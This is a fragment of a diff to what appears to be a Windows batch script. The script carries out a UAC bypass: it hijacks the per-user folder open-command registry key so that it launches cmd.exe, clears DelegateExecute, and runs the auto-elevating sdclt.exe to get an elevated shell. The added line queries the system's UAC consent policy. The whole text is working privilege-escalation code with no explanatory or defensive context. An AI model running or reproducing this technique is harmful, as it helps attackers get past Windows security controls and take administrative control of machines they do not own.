@@ -6,3 +6,5 @@ REG DELETE "HKCU\Software\Classes\mscfile" /f
 REG ADD "HKCU\Software\Classes\folder\shell\open\command" /d "cmd.exe" /f
 REG ADD "HKCU\Software\Classes\folder\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
 sdclt.exe
+
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
